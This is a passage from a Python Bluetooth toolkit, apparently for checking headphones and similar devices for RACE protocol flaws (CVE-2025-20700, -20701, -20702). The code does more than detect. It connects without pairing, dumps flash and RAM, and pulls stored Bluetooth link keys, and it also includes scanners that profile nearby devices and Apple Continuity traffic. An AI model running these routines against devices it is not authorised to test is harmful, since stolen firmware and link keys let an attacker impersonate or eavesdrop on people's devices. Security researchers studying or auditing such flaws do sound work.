    if bdaddr and ":" in bdaddr and len(bdaddr) == 17:
        logging.info(
            "Bluetooth Classic address provided (%s), skipping BLE scan.",
            bdaddr
        )
        skip_ble = True
        # Mark BLE vulns as not applicable since we're skipping
        _get_vuln(vulnerabilities,
                  "CVE-2025-20700").status = VulnerabilityStatus.NOT_APPLICABLE
        _get_vuln(vulnerabilities,
                  "CVE-2025-20702_LE").status = VulnerabilityStatus.NOT_APPLICABLE

    if not skip_ble:
        logging.info("Step 1: Scanning Bluetooth Low Energy devices.")
        logging.info("Scanning for 10 seconds using Bleak scanner...")
        logging.info("")
        logging.info(
            "NOTE: Using system Bluetooth stack for device discovery.")
        logging.info("")

        # Bleak uses system Bluetooth stack - don't release controller yet
        try:
            from bleak import BleakScanner

            devices_found = {}

            def on_ble_device(device, adv_data):
                addr_str = device.address
                name = device.name or adv_data.local_name or "(unknown)"
                rssi = adv_data.rssi

                if addr_str not in devices_found:
                    devices_found[addr_str] = {
                        "name": name,
                        "rssi": rssi,
                        "device": device
                    }
                    logging.info("  Found: %s  %-25s  RSSI: %ddBm",
                                 addr_str, name[:25], rssi if rssi else 0)

            scanner = BleakScanner(detection_callback=on_ble_device)
            logging.info("-" * 60)
            await scanner.start()
            await asyncio.sleep(10.0)
            await scanner.stop()
            logging.info("-" * 60)
            logging.info("")

            if not devices_found:
                logging.warning("No BLE devices found.")
                logging.info("")
                logging.info("Tips:")
                logging.info("  - Make sure your device is powered on")
                logging.info("  - Try moving closer to the device")
                logging.info(
                    "  - Some devices only advertise when not connected")
                logging.info(
                    "  - If you know the address, use --target-address directly")
                logging.info("")
            else:
                # Use helper function to display and select device
                devices_dict = {addr: info["name"]
                                for addr, info in devices_found.items()}
                rssi_dict = {addr: info.get("rssi", -999)
                             for addr, info in devices_found.items()}

                result = _display_and_select_ble_device(
                    devices_dict, rssi_dict)

                if not result:
                    # User cancelled - do nothing, will fall through to Classic checks
                    pass
                else:
                    addr, dev_name = result
                    logging.info("")
                    logging.info(
                        "Connecting to %s (%s) to check for RACE UUIDs...",
                        dev_name if dev_name else addr, addr)
                    logging.info("")
                    logging.info(
                        "Releasing Bluetooth controller for direct HCI access (Bumble)...")

                    # Now release the controller for Bumble to use
                    release_bluetooth_controller(controller)

                    # Now use Bumble to connect and check UUIDs
                    le_checker = GATTBumbleChecker(controller, addr)
                    await le_checker.setup(_noop_recv)

                    try:
                        uuid_found = await le_checker.check_UUIDs(addr)
                    except asyncio.CancelledError:
                        logging.warning(
                            "BLE connection was cancelled. The device may have disconnected."
                        )
                        uuid_found = False
                    except (OSError, ConnectionError, BrokenPipeError) as e:
                        logging.warning("BLE connection error: %s", e)
                        uuid_found = False

                    if uuid_found:
                        _get_vuln(vulnerabilities,
                                  "CVE-2025-20700").status = VulnerabilityStatus.VULNERABLE

                        logging.info(
                            "Initiating a proper BLE connection to %s on %s.",
                            dev_name, addr
                        )
                        le_transport = GATTBumbleTransport(
                            controller, addr, [], False)
                        le_transport.connection = le_checker.connection
                        le_transport.device = le_checker.device
                        await le_transport.setup_gatt(_noop_recv)
                        r = RACE(le_transport, args.send_delay)
                        logging.info("Trying to read flash via BLE.")
                        d = RACEFlashDumper(r, 0x08000000, 0x1000)
                        # try to dump with a 10-second timeout
                        status = VulnerabilityStatus.FIXED
                        try:
                            dump_data = await asyncio.wait_for(d.dump(), 10.0)
                            # Check if we got valid data or just error responses
                            if dump_data and _is_valid_dump(dump_data):
                                status = VulnerabilityStatus.VULNERABLE
                                collected_dumps["ble_flash"] = dump_data
                            elif d.had_errors:
                                logging.warning(
                                    "Flash dump had errors - "
                                    "device may have partial protections"
                                )
                            else:
                                logging.warning(
                                    "Flash dump returned invalid/empty data"
                                )
                        except asyncio.TimeoutError:
                            logging.warning(
                                "Timeout! Unable to dump flash within 10 seconds. "
                                "Device might be fixed!"
                            )
                        except (OSError, ConnectionError, BrokenPipeError) as e:
                            logging.warning(
                                "Unable to dump flash. Device might be fixed! Error is %s",
                                e
                            )
                        _get_vuln(vulnerabilities,
                                  "CVE-2025-20702_LE").status = status

                        r = RACE(le_transport, args.send_delay)
                        await r.setup()
                        if not bdaddr:
                            try:
                                logging.info(
                                    "Trying to obtain the Bluetooth Classic address "
                                    "for next step."
                                )
                                await asyncio.wait_for(
                                    r.send_sync(GetEDRAddress()), 8.0
                                )
                                bdaddr = GetEDRAddressResponse.unpack(
                                    r.sync_payload).bd_addr
                                bdaddr = ":".join(
                                    f"{byte:02X}" for byte in bdaddr)
                                logging.info(
                                    "Got Bluetooth Classic address %s", bdaddr
                                )
                            except asyncio.TimeoutError:
                                logging.warning(
                                    "Timeout! Unable to retrieve Bluetooth Classic "
                                    "address within 8 seconds. The RACE command might "
                                    "be unavailable, which is expected for many devices."
                                )
                            except (OSError, ConnectionError, BrokenPipeError) as e:
                                logging.warning(
                                    "Error receiving BD addr: %s.", e)

                        await le_transport.close()
                        await le_checker.close()
                    else:
                        # uuid_found was False - close the checker and mark as not vulnerable
                        logging.info("No known RACE UUIDs found via GATT.")
                        logging.info("")
                        logging.info(
                            "BLE Result: Device does not appear to expose RACE via BLE.")
                        logging.info(
                            "  - CVE-2025-20700 (GATT auth bypass): NOT VULNERABLE")
                        logging.info(
                            "  - CVE-2025-20702 via BLE: NOT VULNERABLE")
                        await le_checker.close()

        except ImportError:
            logging.error(
                "BLE scanning requires 'bleak' package. Install with: pip install bleak")
            logging.info("Falling back to skipping BLE checks.")
        except Exception as e:
            error_msg = str(e)
            if "No Bluetooth adapters found" in error_msg or "NO_BLUETOOTH" in error_msg:
                logging.warning(
                    "Bleak could not find system Bluetooth adapters.")
                logging.info("Falling back to Bumble-based BLE scanning...")
                logging.info("")

                # Fall back to Bumble-based scanning for external USB dongles
                try:
                    # Release controller for Bumble
                    release_bluetooth_controller(controller)

                    logging.info(
                        "Scanning with Bumble (supports USB dongles)...")
                    le_checker = GATTBumbleChecker(
                        controller, args.target_address)
                    await le_checker.setup(_noop_recv)
                    scan_res = await le_checker.scan_devices()

                    if scan_res:
                        addr, dev_name = scan_res
                        display_name = dev_name if dev_name else "(Unknown)"
                        logging.info("")
                        logging.info("Selected device: %s (%s)",
                                     display_name, addr)
                        logging.info("Connecting to check for RACE UUIDs...")

                        try:
                            uuid_found = await asyncio.wait_for(
                                le_checker.check_UUIDs(addr), timeout=10.0)
                        except asyncio.TimeoutError:
                            logging.warning(
                                "Connection timed out after 10 seconds. Device may be unavailable or out of range."
                            )
                            uuid_found = False
                        except asyncio.CancelledError:
                            logging.warning(
                                "BLE connection was cancelled. The device may have disconnected."
                            )
                            uuid_found = False
                        except (OSError, ConnectionError, BrokenPipeError) as e:
                            logging.warning("BLE connection error: %s", e)
                            uuid_found = False

                        if uuid_found:
                            _get_vuln(vulnerabilities,
                                      "CVE-2025-20700").status = VulnerabilityStatus.VULNERABLE

                            logging.info(
                                "Initiating a proper BLE connection to %s on %s.",
                                dev_name, addr
                            )
                            le_transport = GATTBumbleTransport(
                                controller, addr, [], False)
                            le_transport.connection = le_checker.connection
                            le_transport.device = le_checker.device
                            await le_transport.setup_gatt(_noop_recv)
                            r = RACE(le_transport, args.send_delay)
                            logging.info("Trying to read flash via BLE.")
                            d = RACEFlashDumper(r, 0x08000000, 0x1000)
                            status = VulnerabilityStatus.FIXED
                            try:
                                dump_data = await asyncio.wait_for(d.dump(), 10.0)
                                if dump_data and _is_valid_dump(dump_data):
                                    status = VulnerabilityStatus.VULNERABLE
                                    collected_dumps["ble_flash"] = dump_data
                                elif d.had_errors:
                                    logging.warning(
                                        "Flash dump had errors - "
                                        "device may have partial protections"
                                    )
                                else:
                                    logging.warning(
                                        "Flash dump returned invalid/empty data"
                                    )
                            except asyncio.TimeoutError:
                                logging.warning(
                                    "Timeout! Unable to dump flash within 10 seconds. "
                                    "Device might be fixed!"
                                )
                            except (OSError, ConnectionError, BrokenPipeError) as e:
                                logging.warning(
                                    "Unable to dump flash. Device might be fixed! Error is %s",
                                    e
                                )
                            _get_vuln(vulnerabilities,
                                      "CVE-2025-20702_LE").status = status

                            r = RACE(le_transport, args.send_delay)
                            await r.setup()
                            if not bdaddr:
                                try:
                                    logging.info(
                                        "Trying to obtain the Bluetooth Classic address "
                                        "for next step."
                                    )
                                    await asyncio.wait_for(
                                        r.send_sync(GetEDRAddress()), 8.0
                                    )
                                    bdaddr = GetEDRAddressResponse.unpack(
                                        r.sync_payload).bd_addr
                                    bdaddr = ":".join(
                                        f"{byte:02X}" for byte in bdaddr)
                                    logging.info(
                                        "Got Bluetooth Classic address %s", bdaddr
                                    )
                                except asyncio.TimeoutError:
                                    logging.warning(
                                        "Timeout! Unable to retrieve Bluetooth Classic "
                                        "address within 8 seconds. The RACE command might "
                                        "be unavailable, which is expected for many devices."
                                    )
                                except (OSError, ConnectionError, BrokenPipeError) as e:
                                    logging.warning(
                                        "Error receiving BD addr: %s.", e)

                            await le_transport.close()
                            await le_checker.close()
                        else:
                            logging.info("No known RACE UUIDs found via GATT.")
                            logging.info("")
                            logging.info(
                                "BLE Result: Device does not appear to expose RACE via BLE.")
                            logging.info(
                                "  - CVE-2025-20700 (GATT auth bypass): NOT VULNERABLE")
                            logging.info(
                                "  - CVE-2025-20702 via BLE: NOT VULNERABLE")
                            await le_checker.close()
                    else:
                        logging.info(
                            "No BLE device selected. Skipping BLE checks.")

                except Exception as fallback_error:
                    logging.error(
                        "Bumble scanning also failed: %s", fallback_error)
                    logging.info("Skipping BLE checks.")
            else:
                logging.error("BLE scan failed: %s", e)
                logging.info("Skipping BLE checks.")

    # Ask user if they want to continue with Bluetooth Classic
    logging.info("")
    logging.info("-" * 60)
    logging.info(
        "Would you like to check Bluetooth Classic? [Y/n/q]: "
    )
    response = input().strip().lower()
    if response in ("q", "quit", "exit"):
        logging.info("Exiting.")
        _print_vulnerability_summary(vulnerabilities, bdaddr, controller)
        return
    if response in ("n", "no"):
        logging.info("Skipping Bluetooth Classic checks.")
        _print_vulnerability_summary(vulnerabilities, bdaddr, controller)
        return

    # Step 2: Classic Checks.
    # - if we have a BD addr supplied by user or retrieved via RACE we will take it
    # - if not, scan for Classic devices or ask the user
    # - if we have the address:
    #   - enumerate RFCOMM services and look for known UUIDs
    #   - try to read flash via RFCOMM
    logging.info("Step 2: Checking Bluetooth Classic connection")

    # Release the Bluetooth controller again before Step 2
    release_bluetooth_controller(controller)

    if not bdaddr:
        # Scan for Classic devices
        logging.info("No Bluetooth Classic address available, scanning...")
        classic_devices = await scan_classic_devices(controller, timeout=10.0)
        bdaddr = select_classic_device(classic_devices, None)
        if not bdaddr:
            logging.error(
                "Cannot proceed without a Bluetooth Classic address.")
            # Print summary of what we found so far
            _print_vulnerability_summary(vulnerabilities, bdaddr, controller)
            return
        # Need to release again after scanning
        release_bluetooth_controller(controller)

    # Ensure bdaddr is a string (it could be bytes from GetEDRAddressResponse)
    if isinstance(bdaddr, bytes):
        bdaddr = bdaddr.decode("ascii")
    bdaddr_str: str = str(bdaddr)
    classic_checker = RFCOMMBumbleChecker(controller, bdaddr_str, False)
    await classic_checker.setup()
    logging.info("Trying to find RACE SSP RFCOMM UUID.")

    check_classic = True
    uuid = None
    max_retries = 3
    retry_delay = 3.0  # Start with 3 seconds

    for attempt in range(max_retries + 1):
        try:
            uuid = await classic_checker.check_UUIDs()
            break  # Success, exit retry loop
        except Exception as e:  # pylint: disable=broad-exception-caught
            # Catch all exceptions including bumble.core.ConnectionError
            error_str = str(e).lower()
            if "limited_resources" in error_str:
                if attempt == 0:
                    logging.error(
                        "Connection rejected by remote device - "
                        "device has too many active connections."
                    )
                    logging.info(
                        "This usually means the target device needs time "
                        "to free up connection slots."
                    )
                else:
                    logging.warning("Retry %d/%d failed.",
                                    attempt, max_retries)

                if attempt < max_retries:
                    await classic_checker.close()
                    # Reset our controller just in case
                    reset_usb_bluetooth_controller(controller)
                    release_bluetooth_controller(controller)
                    logging.info(
                        "Waiting %.1f seconds before retry %d/%d...",
                        retry_delay, attempt + 1, max_retries
                    )
                    await asyncio.sleep(retry_delay)
                    retry_delay *= 1.5  # Exponential backoff
                    classic_checker = RFCOMMBumbleChecker(
                        controller, bdaddr_str, False)
                    await classic_checker.setup()
                else:
                    logging.error(
                        "All %d retries exhausted. The target device may be "
                        "busy or have too many connections.", max_retries
                    )
                    logging.info(
                        "Try again later or disconnect other devices from the "
                        "target."
                    )
                    logging.info(
                        "Skipping the rest of Bluetooth Classic checks."
                    )
                    check_classic = False
                    await classic_checker.close()
            elif "page_timeout" in error_str:
                logging.error(
                    "Device not responding. Is it powered on and in range?"
                )
                logging.info("Skipping the rest of Bluetooth Classic checks.")
                check_classic = False
                await classic_checker.close()
                break
            else:
                logging.error(
                    "Unable to create a Bluetooth Classic connection: %s", e
                )
                logging.info("Skipping the rest of Bluetooth Classic checks.")
                check_classic = False
                await classic_checker.close()
                break

    if check_classic:
        logging.info(
            "Checking Bluetooth Classic Pairing Issue by initiating an HfP connection."
        )
        auth_check = await classic_checker.check_auth_vuln()
        if auth_check:
            logging.info("Connection was successful without pairing!")
            _get_vuln(vulnerabilities,
                      "CVE-2025-20701").status = VulnerabilityStatus.VULNERABLE
        else:
            logging.info("Connection without pairing was not successful.")
            _get_vuln(vulnerabilities,
                      "CVE-2025-20701").status = VulnerabilityStatus.FIXED

        if uuid:
            logging.info("Trying to connect to RFCOMM RACE interface.")
            await classic_checker.close()

            rfcomm = RFCOMMTransport(
                controller, bdaddr_str, False, uuid=uuid)

            try:
                r = RACE(rfcomm, args.send_delay)
                await r.setup()

                logging.info("Trying to read flash via Bluetooth Classic.")
                d = RACEFlashDumper(r, 0x08000000, 0x1000)
                # try to dump with a 10-second timeout
                status = VulnerabilityStatus.FIXED
                try:
                    dump_data = await asyncio.wait_for(d.dump(), 10.0)
                    # Check if we got valid data or just error responses
                    if dump_data and _is_valid_dump(dump_data):
                        status = VulnerabilityStatus.VULNERABLE
                        collected_dumps["classic_flash"] = dump_data
                        # There might be the rare case that HfP is not possible
                        # without pairing, but RACE is? Then still vulnerable!
                        _get_vuln(vulnerabilities,
                                  "CVE-2025-20701").status = status
                    elif d.had_errors:
                        logging.warning(
                            "Flash dump had errors - device may have partial protections"
                        )
                    else:
                        logging.warning(
                            "Flash dump returned invalid/empty data"
                        )
                except asyncio.TimeoutError:
                    logging.warning(
                        "Timeout! Unable to dump flash within 10 seconds. "
                        "Device might be fixed!"
                    )
                except (OSError, ConnectionError, BrokenPipeError) as e:
                    logging.warning(
                        "Unable to dump flash. Device might be fixed! Error is %s", e
                    )
                _get_vuln(vulnerabilities,
                          "CVE-2025-20702_BR_EDR").status = status
                await rfcomm.close()
            except asyncio.CancelledError as e:
                logging.warning(
                    "Error connecting to device via RACE over RFCOMM (%s).", e
                )
                _get_vuln(
                    vulnerabilities, "CVE-2025-20702_BR_EDR").status = VulnerabilityStatus.FIXED

        else:
            logging.warning(
                "The device might not expose RACE via Bluetooth Classic!")
            _get_vuln(
                vulnerabilities, "CVE-2025-20702_BR_EDR").status = VulnerabilityStatus.FIXED

    _print_vulnerability_summary(vulnerabilities, bdaddr, controller)

    # Cleanup: Close any open Bumble connections
    try:
        if 'classic_checker' in locals() and classic_checker:
            await classic_checker.close()
    except Exception as e:
        logging.debug("Error closing classic_checker: %s", e)

    # Give USB transfers time to complete before event loop closes
    await asyncio.sleep(0.5)

    # Output collected firmware dumps
    if collected_dumps:
        # Combine all dumps (prefer classic over BLE if both exist)
        dump_data = collected_dumps.get(
            "classic_flash") or collected_dumps.get("ble_flash")
        if dump_data:
            if args.outfile:
                with open(args.outfile, "wb") as f:
                    f.write(dump_data)
                logging.info("Firmware dump saved to %s", args.outfile)
            else:
                logging.info("Firmware dump (hexdump):")
                hexdump(dump_data)
    else:
        logging.info("No firmware was successfully dumped during the check.")


async def command_ram(r: RACE, address: int, size: int, outfile: str, debug: bool):
    """Dump RAM memory from the target device."""
    await _dump_memory(
        RACERAMDumper, r, address, size, outfile, debug,
        alignment=0x4, unit="word"
    )


async def command_flash(r: RACE, address: int, size: int, outfile: str, debug: bool):
    """Dump flash memory from the target device."""
    await _dump_memory(
        RACEFlashDumper, r, address, size, outfile, debug,
        alignment=0x100, unit="page"
    )


async def command_link_keys(r: RACE, outfile: str):
    """Retrieve Bluetooth link keys from the target device."""
    def display_keys(data: bytes):
        pkt = GetLinkKeyResponse.unpack(data)
        logging.info("Found %d link keys:", pkt.num_of_devices)
        for i, key in enumerate(pkt.link_keys):
            logging.info("%d: %s", i, key.hex())

    response = await _send_race_command(
        r, GetLinkKey(), outfile,
        log_request="Sending get link key request",
        log_response="Got link key response",
        display_func=display_keys
    )
    # If writing to file, write payload only
    if outfile:
        pkt = GetLinkKeyResponse.unpack(response)
        with open(outfile, "wb") as f:
            f.write(pkt.payload)


async def command_bdaddr(r: RACE, outfile: str):
    """Retrieve Bluetooth address from the target device."""
    logging.info("Sending get Bluetooth address request")
    await r.setup()
    p = GetEDRAddress()
    res = await r.send_sync(p)
    addr_pkt = GetEDRAddressResponse.unpack(res)
    logging.info("Got Bluetooth address response")

    if outfile:
        with open(outfile, "wb") as f:
            f.write(res)
    else:
        formatted_address = ":".join(
            f"{byte:02X}" for byte in addr_pkt.bd_addr)
        logging.info(formatted_address)


async def command_scan(args: argparse.Namespace):
    """Scan for nearby Bluetooth devices.

    Scans for Bluetooth Classic (BR/EDR) and/or BLE devices.
    Classic scan uses Extended Inquiry to get device names and class.
    """
    from bumble.device import Device, DeviceConfiguration
    from bumble.transport import open_transport_or_link
    from bumble.hci import Address, HCI_Write_Inquiry_Mode_Command

    controller = args.controller or "usb:0"
    mode = getattr(args, 'mode', 'classic')
    timeout = getattr(args, 'timeout', 10.0)
    use_extended = getattr(args, 'extended', False)

    logging.info("=" * 60)
    logging.info("Bluetooth Device Scanner")
    logging.info("=" * 60)
    logging.info("")

    devices_found: dict[str, dict] = {}

    if mode in ("classic", "both"):
        # Release Bluetooth controller for Classic (Bumble needs direct HCI access)
        release_bluetooth_controller(controller)
        logging.info("Scanning for Bluetooth Classic (BR/EDR) devices...")
        logging.info("  Duration: %.0f seconds", timeout)
        logging.info(
            "  Mode: %s", "Extended Inquiry" if use_extended else "Standard Inquiry")
        logging.info("")
        logging.info("NOTE: Standard inquiry only finds DISCOVERABLE devices.")
        logging.info(
            "To find non-discoverable devices, you need their address.")
        logging.info("")

        try:
            t = await open_transport_or_link(controller)
            config = DeviceConfiguration()
            config.keystore = "JsonKeyStore"
            config.address = Address.generate_static_address()
            config.name = "BTScanner"
            device = Device.from_config_with_hci(config, t.source, t.sink)
            device.classic_enabled = True
            await device.power_on()

            # Enable Extended Inquiry Mode for more info
            if use_extended:
                try:
                    # Mode 2 = Extended Inquiry Result with RSSI
                    await device.send_command(
                        HCI_Write_Inquiry_Mode_Command(inquiry_mode=2)
                    )
                    logging.debug("Extended Inquiry Mode enabled")
                except Exception as e:
                    logging.debug("Could not enable extended inquiry: %s", e)

            def on_inquiry_result(address, class_of_device, data, rssi):
                addr_str = str(address)

                # Parse Class of Device
                cod_major = (class_of_device >> 8) & 0x1F
                cod_minor = (class_of_device >> 2) & 0x3F
                major_classes = {
                    0: "Miscellaneous",
                    1: "Computer",
                    2: "Phone",
                    3: "LAN/Network",
                    4: "Audio/Video",
                    5: "Peripheral",
                    6: "Imaging",
                    7: "Wearable",
                    8: "Toy",
                    9: "Health",
                    31: "Uncategorized",
                }
                major_str = major_classes.get(
                    cod_major, f"Unknown({cod_major})")

                # Get name from EIR data
                name = data.get(0x09)  # Complete Local Name
                if not name:
                    name = data.get(0x08)  # Shortened Local Name
                if name:
                    if isinstance(name, bytes):
                        name = name.decode("utf-8", errors="replace")
                else:
                    name = "(unknown)"

                # Store device info
                if addr_str not in devices_found:
                    devices_found[addr_str] = {
                        "name": name,
                        "rssi": rssi,
                        "class": major_str,
                        "class_raw": class_of_device,
                        "type": "Classic"
                    }
                    logging.info(
                        "  Found: %s  %-20s  RSSI: %ddBm  Class: %s",
                        addr_str, name[:20], rssi if rssi else 0, major_str
                    )

            device.on("inquiry_result", on_inquiry_result)

            logging.info("-" * 60)
            await device.start_discovery()
            await asyncio.sleep(timeout)
            await device.stop_discovery()
            await t.close()
            logging.info("-" * 60)

        except Exception as e:
            logging.error("Classic scan failed: %s", e)

    if mode in ("ble", "both"):
        logging.info("")
        logging.info("Scanning for Bluetooth Low Energy (BLE) devices...")
        logging.info("  Duration: %.0f seconds", timeout)
        logging.info("")

        try:
            from bleak import BleakScanner

            def on_ble_device(device, adv_data):
                addr_str = device.address
                name = device.name or adv_data.local_name or "(unknown)"
                rssi = adv_data.rssi

                if addr_str not in devices_found:
                    devices_found[addr_str] = {
                        "name": name,
                        "rssi": rssi,
                        "class": "BLE",
                        "type": "BLE"
                    }
                    logging.info(
                        "  Found: %s  %-20s  RSSI: %ddBm",
                        addr_str, name[:20], rssi if rssi else 0
                    )

            scanner = BleakScanner(detection_callback=on_ble_device)
            logging.info("-" * 60)
            await scanner.start()
            await asyncio.sleep(timeout)
            await scanner.stop()
            logging.info("-" * 60)

        except ImportError:
            logging.error("BLE scanning requires 'bleak' package")
        except Exception as e:
            logging.error("BLE scan failed: %s", e)

    # Summary
    logging.info("")
    logging.info("=" * 60)
    logging.info("SCAN RESULTS: %d devices found", len(devices_found))
    logging.info("=" * 60)
    logging.info("")

    if devices_found:
        # Sort by RSSI (strongest first)
        sorted_devices = sorted(
            devices_found.items(),
            key=lambda x: x[1].get("rssi", -999) or -999,
            reverse=True
        )

        logging.info("%-18s  %-22s  %-8s  %-12s",
                     "ADDRESS", "NAME", "RSSI", "TYPE")
        logging.info("-" * 65)
        for addr, info in sorted_devices:
            logging.info(
                "%-18s  %-22s  %-8s  %-12s",
                addr,
                info["name"][:22],
                f"{info['rssi']}dBm" if info.get('rssi') else "N/A",
                info.get("class", info["type"])
            )
        logging.info("")
        logging.info("To connect to a device, use:")
        logging.info(
            "  python race_toolkit.py --target-address <ADDRESS> <command>")
    else:
        logging.info("No devices found.")
        logging.info("")
        logging.info("Tips:")
        logging.info("  - Make sure target devices are powered on")
        logging.info("  - Classic devices must be in DISCOVERABLE mode")
        logging.info("  - Try increasing --timeout")
        logging.info(
            "  - If you know the address, use --target-address directly")


async def command_ble_scan(args: argparse.Namespace):
    """BLE scanning with live table display and device enumeration.

    Uses active scanning to discover BLE devices and enumerate their
    services. Similar to what nRF Connect app does.
    """
    from bumble.device import Device, DeviceConfiguration
    from bumble.transport import open_transport_or_link
    from bumble.hci import (
        Address,
        HCI_LE_Set_Scan_Parameters_Command,
        HCI_LE_Set_Scan_Enable_Command,
    )
    from bumble.core import AdvertisingData
    import shutil

    controller = args.controller or "usb:0"
    timeout = getattr(args, 'timeout', 0)
    name_filter = getattr(args, 'filter', None)
    addr_filter = getattr(args, 'filter_addr', None)
    show_raw = getattr(args, 'show_raw', False)
    show_uuids = getattr(args, 'show_uuids', False)

    # Release Bluetooth controller
    release_bluetooth_controller(controller)

    devices_seen: dict[str, dict] = {}
    packet_count = [0]
    start_time = [None]
    running = [True]
    enum_in_progress = [False]  # Track if enumeration is happening
    scan_paused_since = [None]  # Track when scanning was paused
    device = None
    t = None

    # Set up signal handler for clean Ctrl+C exit
    import signal

    def signal_handler(sig, frame):
        running[0] = False
    original_handler = signal.signal(signal.SIGINT, signal_handler)

    # Extended Manufacturer Company IDs (Bluetooth SIG Assigned Numbers)
    # Source: https://www.bluetooth.com/specifications/assigned-numbers/
    COMPANIES = {
        0x0003: "IBM",
        0x0004: "Toshiba",
        0x0006: "Microsoft",
        0x000A: "CSR",
        0x000D: "Texas Instruments",
        0x000F: "Broadcom",
        0x0013: "Atmel",
        0x001D: "Qualcomm",
        0x0044: "Socket Mobile",
        0x004C: "Apple",
        0x0059: "Nordic Semiconductor",
        0x005F: "Wicentric",
        0x0065: "HP",
        0x006B: "Polar Electro",
        0x0075: "Samsung",
        0x0077: "Laird Connectivity",
        0x0078: "Nike",
        0x0087: "Garmin",
        0x008A: "Jawbone",
        0x008C: "Gimbal",
        0x009E: "Bose",
        0x00B5: "Swirl Networks",
        0x00BD: "Aplix",
        0x00C4: "LG Electronics",
        0x00C7: "Quuppa",
        0x00CC: "Beats Electronics",
        0x00CD: "Microchip",
        0x00D2: "Dialog Semiconductor",
        0x00DF: "Misfit (Fossil)",
        0x00E0: "Google",
        0x00F0: "PayPal",
        0x0104: "PLUS Location",
        0x011B: "Aruba (HPE)",
        0x012D: "Sony",
        0x0131: "Cypress Semiconductor",
        0x0136: "Seed Labs",
        0x013A: "Tencent",
        0x0147: "Mighty Cast",
        0x0154: "Pebble",
        0x0157: "Xiaomi",
        0x015D: "Estimote",
        0x015E: "UniKey",
        0x0171: "Amazon",
        0x0180: "Gigaset",
        0x0195: "Zuli",
        0x01AB: "Facebook (Meta)",
        0x01B5: "Nest Labs (Google)",
        0x01D1: "August Home",
        0x01DA: "Logitech",
        0x0211: "Telink",
        0x0225: "Nestle Nespresso",
        0x027D: "Huawei",
        0x02B2: "Oura",
        0x02D3: "Powercast",
        0x02F2: "GoPro",
        0x0309: "Dolby",
        0x030F: "Realtek",
        0x0310: "Xiaomi",  # Alternate ID
        0x0399: "Nikon",
        0x03C2: "Snapchat",
        0x03DA: "EnOcean",
        0x0499: "Ruuvi Innovations",
        0x0528: "Lunera",
        0x054C: "Sony",  # Alternate ID
        0x0583: "Code Blue",
        0x0590: "Pur3",
        0x05A7: "Sonos",
        0x060F: "Signify (Philips Hue)",
        0x0639: "Shenzhen Minew",
        0x0269: "Fitbit",
        0x02FF: "GN Audio (Jabra)",
        0x038F: "Tile",
        0x0891: "Tile",  # Alternate ID
        # Add more from online tracker detection
        0x0046: "MediaTek",
        0x0B00: "Espressif (ESP32)",
        0x0047: "Murata",
        0x0002: "Intel",
    }

    # Apple Continuity Protocol message types
    APPLE_CONTINUITY_TYPES = {
        0x02: "iBeacon",
        0x03: "AirPrint",
        0x05: "AirDrop",
        0x06: "HomeKit",
        0x07: "Proximity Pairing",
        0x08: "Siri",
        0x09: "AirPlay Target",
        0x0A: "AirPlay Source",
        0x0B: "Magic Switch",
        0x0C: "Handoff",
        0x0D: "Tethering Target",
        0x0E: "Tethering Source",
        0x0F: "Nearby Action",
        0x10: "Nearby Info",
        0x12: "FindMy",
    }

    # Apple Nearby Info action codes (device state)
    APPLE_NEARBY_ACTION_CODES = {
        0x00: "Unknown",
        0x01: "Reporting Disabled",
        0x03: "Idle",
        0x05: "Audio+Locked",
        0x07: "Active",
        0x09: "Video Playing",
        0x0A: "Watch Worn+Unlocked",
        0x0B: "Recent Activity",
        0x0D: "Driving",
        0x0E: "Call Active",
    }

    # Apple Nearby Action types
    APPLE_NEARBY_ACTION_TYPES = {
        0x01: "Apple TV Setup",
        0x04: "Mobile Backup",
        0x05: "Watch Setup",
        0x06: "Apple TV Pair",
        0x07: "Internet Relay",
        0x08: "WiFi Password",
        0x09: "iOS Setup",
        0x0A: "Repair",
        0x0B: "Speaker Setup",
        0x0C: "Apple Pay",
        0x0D: "Whole Home Audio Setup",
        0x0E: "Developer Tools Pairing",
        0x0F: "Answered Call",
        0x10: "Ended Call",
        0x11: "DD Ping",
        0x12: "DD Pong",
        0x13: "Remote Auto Fill",
        0x14: "Companion Link Proximity",
        0x15: "Remote Management",
        0x16: "Remote Auto Fill Pong",
        0x17: "Remote Display",
    }

    # Known tracker service UUIDs (16-bit)
    TRACKER_SERVICES = {
        0xFEED: "Tile",
        0xFEEC: "Tile",
        0xFD84: "Tile",
        0xFD6F: "COVID Exposure",  # Contact tracing
        0xFE33: "Chipolo",
        0xFE65: "Chipolo",
        0xFD43: "Apple FindMy",
        0xFD44: "Apple FindMy",
        0xFE2C: "Google Fast Pair",
        0xFDF0: "Google",
        0xFDE2: "Google",
        0xFDAB: "Xiaomi",
        0xFDAA: "Xiaomi",
        0xFD5A: "Samsung SmartThings",
        0xFD69: "Samsung",
    }

    def get_signal_bars(rssi: int) -> str:
        """Convert RSSI to signal strength bars."""
        if rssi >= -50:
            return "████"  # Excellent
        elif rssi >= -60:
            return "███░"  # Good
        elif rssi >= -70:
            return "██░░"  # Fair
        elif rssi >= -80:
            return "█░░░"  # Weak
        else:
            return "░░░░"  # Very weak

    def get_manufacturer(data: AdvertisingData) -> str:
        """Extract manufacturer from advertising data."""
        mfr_data = data.get(AdvertisingData.MANUFACTURER_SPECIFIC_DATA)
        if mfr_data and isinstance(mfr_data, bytes) and len(mfr_data) >= 2:
            company_id = struct.unpack('<H', mfr_data[:2])[0]
            return COMPANIES.get(company_id, f"0x{company_id:04X}")
        return ""

    def parse_apple_continuity(mfr_data: bytes) -> dict:
        """Parse Apple Continuity protocol from manufacturer data.

        Apple uses Company ID 0x004C. After the 2-byte company ID:
        - Byte 0: Message type
        - Byte 1: Message length
        - Bytes 2+: Message data

        Returns dict with parsed data or empty dict if not Apple or parse fails.
        """
        result = {}
        if not mfr_data or len(mfr_data) < 4:
            return result

        company_id = struct.unpack('<H', mfr_data[:2])[0]
        if company_id != 0x004C:  # Apple
            return result

        msg_type = mfr_data[2]
        msg_len = mfr_data[3]

        result["type"] = APPLE_CONTINUITY_TYPES.get(
            msg_type, f"Unknown (0x{msg_type:02X})")
        result["type_code"] = msg_type

        # Validate message length
        if msg_len + 4 > len(mfr_data):
            result["error"] = f"Invalid length: expected {msg_len}, available {len(mfr_data)-4}"
            return result

        try:
            if msg_type == 0x02:  # iBeacon
                if msg_len >= 21:
                    uuid_bytes = mfr_data[4:20]
                    result["ibeacon"] = {
                        "uuid": uuid_bytes.hex(),
                        "major": struct.unpack('>H', mfr_data[20:22])[0],
                        "minor": struct.unpack('>H', mfr_data[22:24])[0],
